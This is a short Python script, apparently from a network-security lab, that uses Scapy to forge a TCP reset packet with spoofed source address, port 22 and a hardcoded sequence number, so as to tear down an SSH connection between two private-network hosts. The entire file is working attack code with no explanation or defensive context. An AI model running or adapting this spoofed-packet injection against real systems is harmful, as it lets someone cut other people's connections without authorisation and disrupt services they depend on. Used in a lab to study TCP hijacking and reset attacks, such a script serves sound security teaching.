#!/usr/bin/python
import sys
from scapy.all import *
print("Sending reset packet")
IPLayer = IP(src="10.0.2.14" , dst="10.0.2.13")
TCPLayer = TCP(sport=22, dport=45316,flags="R" ,seq=596487090)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt,verbose=0)

